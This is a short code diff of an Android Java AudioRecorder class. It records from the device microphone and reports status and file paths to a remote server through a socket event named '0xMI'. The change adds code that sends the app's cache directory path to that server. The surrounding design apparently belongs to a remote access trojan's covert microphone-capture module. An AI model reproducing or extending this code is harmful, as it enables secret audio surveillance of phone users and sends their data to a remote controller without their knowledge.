@@ -30,14 +30,17 @@ public  class AudioRecorder {
         File dir = MainService.getContextOfApplication().getCacheDir();
         try {
             Log.e("DIRR" , dir.getAbsolutePath());
+            JSONObject object = new JSONObject();
+            object.put("file",true);
+            object.put("name","helo");
+            object.put("buffer" , dir.getAbsolutePath());
+            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
+
             audiofile = File.createTempFile("sound", ".mp3", dir);
         } catch (IOException e) {
             Log.e(TAG, "external storage access error");
             return;
         }
-
-
-        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
         recorder = new MediaRecorder();
         recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
         recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
@@ -49,7 +52,7 @@ public  class AudioRecorder {
             object.put("file",true);
             object.put("name","true");
             object.put("buffer" , "starterd recoding");
-        IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
+            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
 
         }
         catch (Exception e) {
@@ -76,7 +79,7 @@ public  class AudioRecorder {
 
                 }
                 catch(Exception e){
-                    
+
                 }
 
             }
